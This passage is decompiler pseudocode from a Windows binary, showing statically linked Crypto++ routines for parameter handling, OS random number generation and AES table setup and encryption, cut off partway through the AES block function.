//----- (0041EBFE) --------------------------------------------------------
int __thiscall sub_41EBFE(_DWORD *this, int a2, _DWORD *a3, int a4, int a5)
{
  int result; // eax
  unsigned int v7; // ecx
  __int64 v8; // [esp+4h] [ebp-8h] BYREF

  v8 = 0i64;
  result = (*(int (__thiscall **)(_DWORD *, int, __int64 *, _DWORD, _DWORD, int, int))(*this + 128))(
             this,
             a2,
             &v8,
             *a3,
             a3[1],
             a4,
             a5);
  v7 = v8;
  this[7] += v8;
  *(_QWORD *)a3 = __PAIR64__(HIDWORD(v8), v7);
  return result;
}

//----- (0041EC44) --------------------------------------------------------
int __thiscall sub_41EC44(_DWORD *this, int a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int result; // eax

  v3 = (void (__thiscall ***)(_DWORD, int))*this;
  if ( v3 )
    (**v3)(v3, 1);
  result = a2;
  *this = a2;
  return result;
}

//----- (0041EC5D) --------------------------------------------------------
char *__thiscall sub_41EC5D(char *this, int a2)
{
  _DWORD *v3; // ecx
  int v4; // eax

  v3 = this + 4;
  *(_DWORD *)this = &CryptoPP::AlgorithmParameters::`vftable';
  *v3 = 0;
  this[8] = *(_BYTE *)(a2 + 8);
  v4 = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a2 + 4) = 0;
  sub_4096AA(v3, v4);
  return this;
}
// 46D670: using guessed type void *CryptoPP::AlgorithmParameters::`vftable';

//----- (0041ECA2) --------------------------------------------------------
_DWORD *__thiscall sub_41ECA2(_DWORD *this)
{
  _DWORD *result; // eax

  *this = &CryptoPP::AlgorithmParameters::`vftable';
  result = this;
  this[1] = 0;
  *((_BYTE *)this + 8) = 1;
  return result;
}
// 46D670: using guessed type void *CryptoPP::AlgorithmParameters::`vftable';

//----- (0041ECB8) --------------------------------------------------------
_DWORD *__thiscall sub_41ECB8(_DWORD *Block, char a2)
{
  sub_40967A(Block + 1);
  *Block = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0041ECE0) --------------------------------------------------------
char __thiscall sub_41ECE0(_DWORD *this, char *a2, int a3, _BYTE **a4)
{
  const char **v4; // ecx

  v4 = (const char **)this[1];
  if ( v4 )
    return sub_41ECF0(v4, a2, a3, a4);
  else
    return 0;
}

//----- (0041ECF0) --------------------------------------------------------
char __thiscall sub_41ECF0(const char **this, char *Src, int a3, _BYTE **a4)
{
  int v5; // ecx
  unsigned __int8 v6; // al
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  unsigned int v10; // eax
  int v11; // edx
  const void **v12; // esi
  unsigned int v13; // eax
  int v14; // edx

  v5 = 0;
  while ( 1 )
  {
    v6 = Src[v5];
    if ( v6 != aValuenames[v5] )
      break;
    if ( ++v5 == 11 )
    {
      v7 = 0;
      goto LABEL_6;
    }
  }
  v7 = v6 < (unsigned __int8)aValuenames[v5] ? -1 : 1;
LABEL_6:
  if ( v7 )
  {
    while ( 1 )
    {
      v8 = strcmp(Src, this[1]);
      if ( v8 )
        v8 = v8 < 0 ? -1 : 1;
      if ( !v8 )
        break;
      this = (const char **)this[3];
      if ( !this )
        return 0;
      v9 = 0;
      while ( Src[v9] == aValuenames[v9] )
      {
        if ( ++v9 == 11 )
          goto LABEL_14;
      }
    }
    (*((void (__thiscall **)(const char **, char *, int, _BYTE **))*this + 1))(this, Src, a3, a4);
    *((_BYTE *)this + 9) = 1;
  }
  else
  {
LABEL_14:
    sub_406577(Src, (char *)&std::string `RTTI Type Descriptor', a3);
    if ( this[3] )
      sub_41ECF0(Src, a3, (int)a4);
    v10 = sub_40BC7D(this[1]);
    v12 = sub_40C68E(a4, v11, this[1], v10);
    v13 = sub_40BC7D(";");
    sub_40C68E((_BYTE **)v12, v14, ";", v13);
  }
  return 1;
}
// 41ED98: variable 'v11' is possibly undefined
// 41EDAF: variable 'v14' is possibly undefined
// 48D370: using guessed type void **std::string `RTTI Type Descriptor';

//----- (0041EDD5) --------------------------------------------------------
char __thiscall sub_41EDD5(_DWORD **this, int a2, int a3, int a4)
{
  char v4; // bl
  int v6; // edx

  v4 = 0;
  v6 = 0;
  while ( *(_BYTE *)(a2 + v6) == aValuenames[v6] )
  {
    if ( ++v6 == 11 )
    {
      if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int, int, int))(*this[1] + 4))(this[1], a2, a3, a4) )
        return v4;
      goto LABEL_7;
    }
  }
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int, int, int))(*this[1] + 4))(this[1], a2, a3, a4) )
    return 1;
LABEL_7:
  if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int, int, int))(*this[2] + 4))(this[2], a2, a3, a4) )
    return v4;
  return 1;
}

//----- (0041EE3F) --------------------------------------------------------
HCRYPTPROV *__thiscall sub_41EE3F(HCRYPTPROV *this)
{
  DWORD LastError; // ebx
  _DWORD pExceptionObject[10]; // [esp+10h] [ebp-50h] BYREF
  _DWORD v5[10]; // [esp+38h] [ebp-28h] BYREF

  *this = 0;
  if ( !CryptAcquireContextA(this, 0, 0, 1u, 0xF0000000) )
  {
    LastError = GetLastError();
    if ( !CryptAcquireContextA(this, "Crypto++ RNG", 0, 1u, 8u)
      && !CryptAcquireContextA(this, "Crypto++ RNG", 0, 1u, 0x28u) )
    {
      SetLastError(LastError);
      sub_40AAE3((int)v5, "CryptAcquireContext");
      v5[9] = 0;
      sub_41EF0F(pExceptionObject, v5);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVOS_RNG_Err_CryptoPP__);
    }
  }
  return this;
}
// 41EE3F: using guessed type _DWORD pExceptionObject[10];

//----- (0041EECC) --------------------------------------------------------
HCRYPTPROV *__thiscall sub_41EECC(HCRYPTPROV *this)
{
  sub_40CAC3(this, 1);
  *this = (HCRYPTPROV)&CryptoPP::NonblockingRng::`vftable';
  sub_41EE3F(this + 1);
  return this;
}
// 46D688: using guessed type void *CryptoPP::NonblockingRng::`vftable';

//----- (0041EEEE) --------------------------------------------------------
std::exception *__thiscall sub_41EEEE(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::OS_RNG_Err::`vftable';
  return this;
}
// 46D67C: using guessed type void *CryptoPP::OS_RNG_Err::`vftable';

//----- (0041EF0F) --------------------------------------------------------
_DWORD *__thiscall sub_41EF0F(_DWORD *this, _DWORD *a2)
{
  int LastError; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _BYTE **v6; // eax
  char *v7; // eax
  _DWORD *v8; // eax
  _DWORD v10[6]; // [esp+14h] [ebp-88h] BYREF
  int v11[6]; // [esp+2Ch] [ebp-70h] BYREF
  _DWORD v12[6]; // [esp+44h] [ebp-58h] BYREF
  _DWORD v13[6]; // [esp+5Ch] [ebp-40h] BYREF
  int v14[9]; // [esp+74h] [ebp-28h] BYREF
  int v15; // [esp+98h] [ebp-4h]

  LastError = GetLastError();
  v4 = sub_40BF8D(v10, LastError, 0x10u);
  v15 = 0;
  v5 = sub_40C8F6(v11, "OS_Rng: ", a2);
  LOBYTE(v15) = 1;
  v6 = (_BYTE **)sub_40BEFB((int)v12, (_BYTE **)v5, " operation failed with error ");
  LOBYTE(v15) = 2;
  v7 = (char *)sub_40BEFB((int)v13, v6, "0x");
  LOBYTE(v15) = 3;
  v8 = (_DWORD *)sub_409630((int)v14, v7, v4);
  LOBYTE(v15) = 4;
  sub_406307(this, 6, v8);
  sub_40BAFC(v14, 1, 0);
  sub_40BAFC(v13, 1, 0);
  sub_40BAFC(v12, 1, 0);
  sub_40BAFC(v11, 1, 0);
  sub_40BAFC(v10, 1, 0);
  *this = &CryptoPP::OS_RNG_Err::`vftable';
  return this;
}
// 46D67C: using guessed type void *CryptoPP::OS_RNG_Err::`vftable';
// 41EF0F: using guessed type _DWORD var_88[6];
// 41EF0F: using guessed type _DWORD var_58[6];
// 41EF0F: using guessed type _DWORD var_40[6];

//----- (0041F004) --------------------------------------------------------
BOOL __thiscall sub_41F004(HCRYPTPROV *this)
{
  BOOL result; // eax

  if ( *this )
    return CryptReleaseContext(*this, 0);
  return result;
}

//----- (0041F014) --------------------------------------------------------
BOOL __thiscall sub_41F014(HCRYPTPROV *this)
{
  *this = (HCRYPTPROV)&CryptoPP::NonblockingRng::`vftable';
  return sub_41F004(this + 1);
}
// 46D688: using guessed type void *CryptoPP::NonblockingRng::`vftable';

//----- (0041F022) --------------------------------------------------------
HCRYPTPROV *sub_41F022()
{
  HCRYPTPROV *v0; // ecx
  HCRYPTPROV *result; // eax

  v0 = (HCRYPTPROV *)operator new(4u);
  result = 0;
  if ( v0 )
    return sub_41EE3F(v0);
  return result;
}

//----- (0041F04F) --------------------------------------------------------
HCRYPTPROV *__thiscall sub_41F04F(HCRYPTPROV *Block, char a2)
{
  sub_41F014(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0041F06E) --------------------------------------------------------
BOOL __stdcall sub_41F06E(BYTE *pbBuffer, DWORD dwLen)
{
  HCRYPTPROV *v2; // eax
  BOOL result; // eax
  _DWORD pExceptionObject[10]; // [esp+14h] [ebp-50h] BYREF
  _DWORD v5[10]; // [esp+3Ch] [ebp-28h] BYREF

  v2 = sub_41F103();
  result = CryptGenRandom(*v2, dwLen, pbBuffer);
  if ( !result )
  {
    sub_40AAE3((int)v5, "CryptGenRandom");
    v5[9] = 0;
    sub_41EF0F(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVOS_RNG_Err_CryptoPP__);
  }
  return result;
}
// 41F06E: using guessed type _DWORD pExceptionObject[10];

//----- (0041F0C8) --------------------------------------------------------
BOOL __cdecl sub_41F0C8(int a1, BYTE *pbBuffer, DWORD dwLen)
{
  void **v4; // [esp+10h] [ebp-14h] BYREF
  HCRYPTPROV v5[4]; // [esp+14h] [ebp-10h] BYREF

  sub_41EECC((HCRYPTPROV *)&v4);
  v5[3] = 0;
  sub_41F06E(pbBuffer, dwLen);
  v4 = &CryptoPP::NonblockingRng::`vftable';
  return sub_41F004(v5);
}
// 46D688: using guessed type void *CryptoPP::NonblockingRng::`vftable';

//----- (0041F103) --------------------------------------------------------
HCRYPTPROV *sub_41F103()
{
  HCRYPTPROV *result; // eax
  int v1; // edi
  HCRYPTPROV *v2; // esi

  if ( dword_490CE4 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_490CE4);
    if ( dword_490CE4 == -1 )
    {
      dword_490CE0 = 0;
      atexit(sub_469FBE);
      _Init_thread_footer(&dword_490CE4);
    }
  }
  result = (HCRYPTPROV *)dword_490CE0;
  if ( !dword_490CE0 )
  {
    result = sub_41F022();
    v1 = dword_490CE0;
    v2 = result;
    if ( dword_490CE0 )
    {
      if ( result )
      {
        sub_41F004(result);
        sub_42CF7C(v2);
      }
      return (HCRYPTPROV *)v1;
    }
    else
    {
      dword_490CE0 = (int)result;
    }
  }
  return result;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 490CE0: using guessed type int dword_490CE0;
// 490CE4: using guessed type int dword_490CE4;
// 492450: using guessed type int TlsIndex;

//----- (0041F193) --------------------------------------------------------
void __thiscall sub_41F193(void *this, int a2, size_t Size)
{
  _DWORD v4[3]; // [esp+10h] [ebp-1Ch] BYREF
  BYTE *pbBuffer; // [esp+1Ch] [ebp-10h]
  int v6; // [esp+28h] [ebp-4h]

  sub_408A33(v4, Size);
  v6 = 0;
  sub_41F0C8(a2, pbBuffer, Size);
  (*(void (__thiscall **)(void *, BYTE *, size_t))(*(_DWORD *)this + 12))(this, pbBuffer, Size);
  sub_4089EF(v4);
}
// 41F193: using guessed type _DWORD var_1C[3];

//----- (0041F1DE) --------------------------------------------------------
void *sub_41F1DE()
{
  return &unk_46D740;
}

//----- (0041F1E4) --------------------------------------------------------
int __thiscall sub_41F1E4(_DWORD *this, int a2)
{
  char *v3; // eax
  int v4; // eax
  char v6[4]; // [esp+10h] [ebp-2Ch] BYREF
  int v7; // [esp+14h] [ebp-28h] BYREF
  int v8[3]; // [esp+1Ch] [ebp-20h] BYREF
  int v9; // [esp+28h] [ebp-14h] BYREF
  void *v10; // [esp+2Ch] [ebp-10h] BYREF
  int v11; // [esp+38h] [ebp-4h]

  v9 = 4;
  v10 = &unk_46D740;
  v3 = sub_40970F(v6, (int)"DecodingLookupArray", &v10, 0);
  v11 = 0;
  v4 = sub_409BCC((int)v3, (int)"Log2Base", &v9, 1);
  v8[0] = (int)&CryptoPP::CombinedNameValuePairs::`vftable';
  v8[1] = a2;
  v8[2] = v4;
  LOBYTE(v11) = 1;
  sub_423D30(this, v8);
  v8[0] = (int)&CryptoPP::NameValuePairs::`vftable';
  return sub_40967A(&v7);
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 46D074: using guessed type void *CryptoPP::CombinedNameValuePairs::`vftable';
// 41F1E4: using guessed type char var_2C[4];

//----- (0041F263) --------------------------------------------------------
_DWORD **__thiscall sub_41F263(_DWORD **this, int a2)
{
  int v2; // edx

  v2 = a2;
  if ( *this )
    v2 = **this ^ a2;
  *this[1]++ = v2;
  if ( *this )
    ++*this;
  return this;
}

//----- (0041F28C) --------------------------------------------------------
void __cdecl sub_41F28C(_DWORD *a1, int a2, unsigned int a3)
{
  unsigned int v3; // ecx
  _DWORD *v4; // edx

  v3 = a3 >> 2;
  if ( a3 >> 2 )
  {
    v4 = a1;
    do
    {
      *v4 = _byteswap_ulong(*(_DWORD *)((char *)v4 + a2 - (_DWORD)a1));
      ++v4;
      --v3;
    }
    while ( v3 );
  }
}

//----- (0041F2B3) --------------------------------------------------------
void __cdecl sub_41F2B3(int a1, _DWORD *Destination, _DWORD *Source, rsize_t DestinationSize)
{
  if ( a1 )
  {
    sub_41F28C(Destination, (int)Source, DestinationSize);
  }
  else if ( Source != Destination )
  {
    memcpy_s(Destination, DestinationSize, Source, DestinationSize);
  }
}

//----- (0041F2EB) --------------------------------------------------------
void __cdecl sub_41F2EB(int a1, _DWORD *Destination, int a3, void *Source, rsize_t SourceSize)
{
  rsize_t v5; // edi
  int v6; // eax
  int v7; // [esp+Ch] [ebp-4h] BYREF

  v5 = SourceSize;
  v7 = 4;
  memcpy_s(Destination, 4 * a3, Source, SourceSize);
  memset((char *)Destination + v5, 0, 4 * a3 - v5);
  v6 = sub_40AA0F(&SourceSize, &v7);
  sub_41F2B3(a1, Destination, Destination, v6);
}

//----- (0041F340) --------------------------------------------------------
unsigned int __userpurge sub_41F340@<eax>(
        int *a1@<ecx>,
        __m64 a2@<mm2>,
        __m64 a3@<mm3>,
        __m128i *a4,
        __m128i *a5,
        __m128i *a6,
        unsigned int a7,
        char a8)
{
  int v10; // ecx
  int v11; // edi
  unsigned int v12; // ebp
  unsigned int v13; // ecx
  __int16 i; // dx
  unsigned int v15; // eax
  unsigned int v16; // esi
  __m128i *v18; // ebx
  __m128i *v19; // esi
  __m128i *v20; // eax
  int v21; // ebp
  int v22; // ebx
  int v23; // esi
  int v24; // [esp-10h] [ebp-18h]
  __int64 *v26; // [esp+14h] [ebp+Ch]
  __int64 *v27; // [esp+18h] [ebp+10h]
  int v28; // [esp+18h] [ebp+10h]

  if ( sub_41F72B() )
    return sub_428C84(a1[69], a1[2], a4, a5, a6, a7, a8);
  if ( !sub_411C74() )
    return sub_40CE19(a1, (unsigned int)a4, (unsigned int)a5, (unsigned int)a6, a7, a8);
  if ( a7 < 0x10 )
    return a7;
  v10 = a1[74];
  a1[72] = a1[73];
  v11 = v10 + (unsigned __int8)-(char)v10;
  v12 = (unsigned int)dword_490CF0 & 0xFFF;
  v13 = (unsigned int)&dword_490CF0[-508] & 0xFFF;
  for ( i = v11 + 268; ; i += 256 )
  {
    v15 = v11 & 0xFFF;
    v16 = i & 0xFFF;
    if ( v13 > v12 )
      break;
    if ( v15 >= v13 && v16 > v13 && v15 < v12 && v16 <= v12 )
      goto LABEL_12;
LABEL_18:
    v11 += 256;
  }
  if ( v15 >= v12 && v15 < v13 || v16 > v12 && v16 <= v13 )
    goto LABEL_18;
LABEL_12:
  v18 = a4;
  v19 = a5;
  v20 = a6;
  if ( (a8 & 8) != 0 )
  {
    v18 = (__m128i *)((char *)a4 + a7 - 16);
    v19 = (__m128i *)((char *)a5 + a7 - 16);
    v20 = (__m128i *)((char *)a6 + a7 - 16);
    v24 = -16;
  }
  else
  {
    v24 = 16;
  }
  *(_DWORD *)(v11 + 224) = v18;
  v26 = off_48C114;
  v21 = v24;
  if ( (a8 & 4) != 0 && v19 )
    v27 = (__int64 *)v19;
  else
    v27 = off_48C114;
  *(_DWORD *)(v11 + 228) = v27;
  if ( (a8 & 4) == 0 && v19 )
    v26 = (__int64 *)v19;
  *(_DWORD *)(v11 + 232) = v26;
  *(_DWORD *)(v11 + 236) = v20;
  v22 = v24;
  if ( (a8 & 2) != 0 )
    v22 = 0;
  *(_DWORD *)(v11 + 240) = v22;
  if ( (a8 & 4) != 0 && v19 )
    v28 = v24;
  else
    v28 = 0;
  *(_DWORD *)(v11 + 244) = v28;
  if ( (a8 & 4) != 0 || !v19 )
    v21 = 0;
  *(_DWORD *)(v11 + 252) = v22;
  v23 = a7 & 0xF;
  *(_DWORD *)(v11 + 248) = v21;
  *(_DWORD *)(v11 + 260) = a7 - (a8 & 1) - v23;
  *(_DWORD *)(v11 + 264) = 16 * ((a8 & 1 | 2) - a1[2] + 12);
  sub_41FCF7((const __m128i *)a1[69], v11, a2, a3);
  return v23;
}
// 48C114: using guessed type __int64 *off_48C114;
// 490CF0: using guessed type int dword_490CF0[];

//----- (0041F54F) --------------------------------------------------------
int sub_41F54F()
{
  int v0; // edx
  int v1; // ecx
  int v2; // ebx
  int v3; // esi
  int v4; // edx
  int v5; // ebp
  int v6; // eax
  int v7; // esi
  int v8; // ebp
  int result; // eax
  unsigned int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+1Ch] [ebp-4h]

  v0 = 0;
  v12 = 0;
  do
  {
    v10 = (unsigned __int8)RijnDael_AES_inv_LONG_46E7E8[v0];
    v1 = v10 ^ (2 * v10);
    v11 = (v10 >> 5) & 1;
    v2 = (v10 >> 5) & 2;
    v3 = (v10 >> 6) & 1;
    v4 = (v10 >> 6) & 2;
    v5 = (452984832 * ((v10 >> 5) & 4)) ^ (452984832 * v4) ^ (452984832 * v3) ^ (452984832 * v2) ^ (452984832 * v11) ^ (452984832 * (v10 >> 7)) ^ ((v10 ^ (2 * v1)) << 25);
    v6 = 72448 * v3;
    v7 = (v10 >> 5) & 4;
    v8 = (18546688 * v7) ^ (18546688 * v2) ^ (18546688 * v11) ^ ((v10 ^ (8 * v10)) << 16) | (72448 * v7) ^ (72448 * v4) ^ v6 ^ (72448 * v2) ^ (72448 * v11) ^ ((v10 ^ (4 * v1)) << 8) | v5;
    result = v8 | v10;
    dword_491500[2 * v12] = v8 | v10;
    dword_491504[2 * v12] = v8 | v10 ^ (283 * v7) ^ (283 * v2) ^ (283 * v11) ^ (283 * (v10 >> 7)) ^ (2 * (v10 ^ (4 * v10)));
    v0 = v12 + 1;
    v12 = v0;
  }
  while ( v0 < 256 );
  byte_491D01 = 1;
  return result;
}
// 491500: using guessed type int dword_491500[];
// 491504: using guessed type int dword_491504[511];
// 491D01: using guessed type char byte_491D01;

//----- (0041F6A7) --------------------------------------------------------
int sub_41F6A7()
{
  int i; // edi
  unsigned int v1; // esi
  int result; // eax

  for ( i = 0; i < 256; ++i )
  {
    v1 = (unsigned __int8)RijnDael_AES_LONG_46E6E8[i];
    result = ((v1 | (v1 << 8)) << 8) | (v1 << 25) ^ (452984832 * (v1 >> 7));
    dword_490CF0[2 * i] = result;
    dword_490CF4[2 * i] = result | v1 ^ (2 * v1) ^ (283 * (v1 >> 7));
  }
  qword_4914F8 = 0i64;
  qword_4914F0 = 0i64;
  byte_491D00 = 1;
  return result;
}
// 490CF0: using guessed type int dword_490CF0[];
// 490CF4: using guessed type int dword_490CF4[509];
// 4914F0: using guessed type __int64 qword_4914F0;
// 4914F8: using guessed type __int64 qword_4914F8;
// 491D00: using guessed type char byte_491D00;

//----- (0041F717) --------------------------------------------------------
int sub_41F717()
{
  if ( !byte_491D08 )
    sub_4254E3();
  return dword_48C1F8;
}
// 48C1F8: using guessed type int dword_48C1F8;
// 491D08: using guessed type char byte_491D08;

//----- (0041F72B) --------------------------------------------------------
char sub_41F72B()
{
  if ( !byte_491D08 )
    sub_4254E3();
  return byte_491D0D;
}
// 491D08: using guessed type char byte_491D08;
// 491D0D: using guessed type char byte_491D0D;

//----- (0041F73F) --------------------------------------------------------
char sub_41F73F()
{
  if ( !byte_491D08 )
    sub_4254E3();
  return byte_491D0B;
}
// 491D08: using guessed type char byte_491D08;
// 491D0B: using guessed type char byte_491D0B;

//----- (0041F753) --------------------------------------------------------
char *__fastcall sub_41F753(int a1, int a2, int a3)
{
  char *result; // eax

  result = sub_420B12(a1, a2, *(char **)(a1 + 264), *(_DWORD *)(a1 + 260), a3, 0);
  *(_DWORD *)(a1 + 260) = a3;
  *(_DWORD *)(a1 + 264) = result;
  *(_DWORD *)(a1 + 256) = 0x3FFFFFFF;
  return result;
}

//----- (0041F78A) --------------------------------------------------------
_DWORD **__userpurge sub_41F78A@<eax>(
        int *a1@<ecx>,
        __m64 a2@<mm2>,
        __m64 a3@<mm3>,
        __m128i *a4,
        __m128i *a5,
        __m128i *a6)
{
  _DWORD *v8; // esi
  int v9; // ebx
  int v10; // eax
  _DWORD *v11; // esi
  int v12; // eax
  unsigned int v13; // ecx
  int v14; // edi
  int v15; // edi
  unsigned int v16; // ebx
  unsigned int v17; // ecx
  unsigned int v18; // edx
  int v19; // edi
  unsigned __int8 v20; // al
  int v21; // edi
  int v22; // eax
  int v23; // edi
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // edx
  int v29; // ebp
  int v30; // ebx
  int v31; // eax
  int v32; // eax
  int v33; // ebx
  int v34; // eax
  unsigned int v35; // ebx
  unsigned int v36; // edx
  int v37; // eax
  int v38; // eax
  int v39; // eax
  unsigned int v40; // ebx
  unsigned int v41; // edi
  unsigned int v42; // edx
  int v43; // eax
  unsigned int v44; // ebx
  int v45; // eax
  int v46; // eax
  unsigned int v47; // edx
  int v48; // eax
  _DWORD **v49; // eax
  _DWORD **v50; // eax
  _DWORD **v51; // eax
  int v52; // [esp-Ch] [ebp-64h]
  int v53; // [esp-8h] [ebp-60h]
  int v54; // [esp-4h] [ebp-5Ch]
  int v55; // [esp+10h] [ebp-48h]
  int v56; // [esp+10h] [ebp-48h]
  unsigned int v57; // [esp+10h] [ebp-48h]
  unsigned int v58; // [esp+10h] [ebp-48h]
  int v59; // [esp+10h] [ebp-48h]
  int v60; // [esp+14h] [ebp-44h]
  unsigned int v61; // [esp+14h] [ebp-44h]
  int v62; // [esp+14h] [ebp-44h]
  unsigned int v63; // [esp+14h] [ebp-44h]
  int v64; // [esp+18h] [ebp-40h]
  int v65; // [esp+18h] [ebp-40h]
  unsigned int v66; // [esp+18h] [ebp-40h]
  unsigned int v67; // [esp+18h] [ebp-40h]
  int v68; // [esp+18h] [ebp-40h]
  int v69; // [esp+1Ch] [ebp-3Ch]
  unsigned int v70; // [esp+1Ch] [ebp-3Ch]
  unsigned int v71; // [esp+1Ch] [ebp-3Ch]
  int v72; // [esp+20h] [ebp-38h]
  int v73; // [esp+20h] [ebp-38h]
  unsigned int v74; // [esp+20h] [ebp-38h]
  int v75; // [esp+20h] [ebp-38h]
  int v76; // [esp+20h] [ebp-38h]
  int v77; // [esp+24h] [ebp-34h]
  int v78; // [esp+24h] [ebp-34h]
  unsigned int v79; // [esp+24h] [ebp-34h]
  int v80; // [esp+2Ch] [ebp-2Ch]
  _DWORD *v81[2]; // [esp+38h] [ebp-20h] BYREF
  int v82; // [esp+40h] [ebp-18h]
  int v83; // [esp+44h] [ebp-14h]
  int v84; // [esp+48h] [ebp-10h]
  int v85; // [esp+4Ch] [ebp-Ch]

  if ( sub_411C74() )
    return (_DWORD **)sub_41F340(a1, a2, a3, a4, a5, a6, 0x10u, 0);
  v8 = (_DWORD *)a1[69];
  v9 = a4->m128i_i32[0] ^ *v8;
  v80 = a4->m128i_i32[1] ^ v8[1];
  v77 = a4->m128i_i32[2] ^ v8[2];
  v60 = a4->m128i_i32[3] ^ v8[3];
  v72 = v8[4];
  v64 = v8[5];
  v69 = v8[6];
  v10 = v8[7];
  v11 = v8 + 8;
  v55 = v10;
  v12 = sub_41F717();
  v13 = 0;
  v14 = 0;
  do
  {
    v14 &= *(int *)((char *)dword_490CF0 + v13);
    v13 += v12;
  }
  while ( v13 < 0x800 );
  v15 = dword_4914E8 & v14;
  v16 = v15 | v9;
  v17 = v15 | v77;
  v61 = v15 | v60;
  v18 = v15 | v80;
  v19 = dword_490CF4[2 * (unsigned __int8)v61] ^ v55;
  v61 >>= 8;
  v20 = v61;
  v61 >>= 8;
  v56 = v19;
  v21 = *(int *)((char *)&dword_490CF0[2 * v20] + 1) ^ v69;
  v22 = (unsigned __int8)v17;
  v17 >>= 8;
  v23 = dword_490CF4[2 * v22] ^ v21;
  v24 = (unsigned __int8)v18;
  v18 >>= 8;
  v65 = dword_490CF4[2 * v24] ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v61] + 2) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v17] + 1) ^ v64;
  v25 = (unsigned __int8)v18;
  v18 >>= 8;
  v73 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v17)] + 2) ^ *(int *)((char *)&dword_490CF0[2 * v25] + 1) ^ *(int *)((char *)&dword_490CF0[2 * (v61 >> 8)] + 3) ^ v72;
  v26 = (unsigned __int8)v16;
  v16 >>= 8;
  v74 = dword_490CF4[2 * v26] ^ v73;
  v27 = (unsigned __int8)v16;
  v16 >>= 8;
  v57 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v18] + 2) ^ *(int *)((char *)&dword_490CF0[2 * v27] + 1) ^ *(int *)((char *)&dword_490CF0[2 * HIWORD(v17)] + 3) ^ v56;
  v28 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v16] + 2) ^ *(int *)((char *)&dword_490CF0[2 * (v18 >> 8)]
                                                                               + 3) ^ v23;
  v29 = ((unsigned int)a1[2] >> 1) - 1;
  v70 = v28;
  v66 = *(int *)((char *)&dword_490CF0[2 * (v16 >> 8)] + 3) ^ v65;
  while ( 1 )
  {
    v30 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v57] + 3);
    v31 = BYTE1(v57);
    v58 = HIWORD(v57);
    v78 = v11[1] ^ *(int *)((char *)&dword_490CF0[2 * v31] + 2);
    v32 = BYTE1(v70);
    v71 = HIWORD(v70);
    v62 = *(int *)((char *)&dword_490CF0[2 * v32] + 2) ^ *v11 ^ v30;
    v33 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v58] + 1) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v66]
                                                                                 + 3) ^ dword_490CF4[2 * (v71 >> 8)];
    v34 = BYTE1(v66);
    v67 = HIWORD(v66);
    v79 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v71] + 1) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v74]
                                                                                 + 3) ^ dword_490CF4[2 * (v67 >> 8)] ^ v78;
    v35 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v74)] + 2) ^ v11[2] ^ v33;
    v36 = *(int *)((char *)&dword_490CF0[2 * BYTE2(v74)] + 1) ^ *(int *)((char *)&dword_490CF0[2 * v34] + 2) ^ v11[3] ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v28] + 3) ^ dword_490CF4[2 * (v58 >> 8)];
    v63 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v67] + 1) ^ dword_490CF4[2 * HIBYTE(v74)] ^ v62;
    v37 = (unsigned __int8)v36;
    v36 >>= 8;
    v75 = v11[4] ^ *(int *)((char *)&dword_490CF0[2 * v37] + 3);
    v38 = (unsigned __int8)v36;
    v36 >>= 8;
    v68 = v11[5] ^ *(int *)((char *)&dword_490CF0[2 * v38] + 2);
    v39 = (unsigned __int8)v35;
    v35 >>= 8;
    v59 = v11[7] ^ *(int *)((char *)&dword_490CF0[2 * v39] + 3) ^ dword_490CF4[2 * (v36 >> 8)];
    v11 += 8;
    v76 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v35] + 2) ^ v75;
    v35 >>= 8;
    v66 = *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v35] + 1) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v63]
                                                                                 + 3) ^ dword_490CF4[2 * HIBYTE(v79)] ^ v68;
    v40 = *(int *)((char *)&dword_490CF0[2 * BYTE1(v63)] + 2) ^ *(v11 - 2) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v36]
                                                                                    + 1) ^ *(int *)((char *)&dword_490CF0[2 * (unsigned __int8)v79]
                                                                                                  + 3) ^ dword_490CF4[2 * (v35 >> 8)];
    v70 = v40;
    v41 = *(int *)((char *)&dword_490CF0[2 * BYTE2(v63)] + 1) ^ *(int *)((char *)&dword_490CF0[2 * BYTE1(v79)] + 2) ^ v59;
    v57 = v41;
    v42 = *(int *)((char *)&dword_490CF0[2 * BYTE2(v79)] + 1) ^ dword_490CF4[2 * HIBYTE(v63)] ^ v76;
